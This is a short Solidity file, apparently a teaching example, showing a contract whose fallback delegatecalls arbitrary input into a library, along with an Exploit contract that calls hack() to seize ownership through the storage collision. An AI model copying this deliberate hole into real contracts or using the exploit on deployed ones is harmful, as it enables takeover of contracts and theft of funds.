// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
    address public owner;

    function hack() public {
        owner = msg.sender;
    }
}

contract Hackable {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }

    receive() external payable {}
}


contract Exploit {
    address public hackable;

    constructor(address _hackable) {
        hackable = _hackable;
    }

    function attack() public {
        hackable.call(abi.encodeWithSignature("hack()"));
    }
}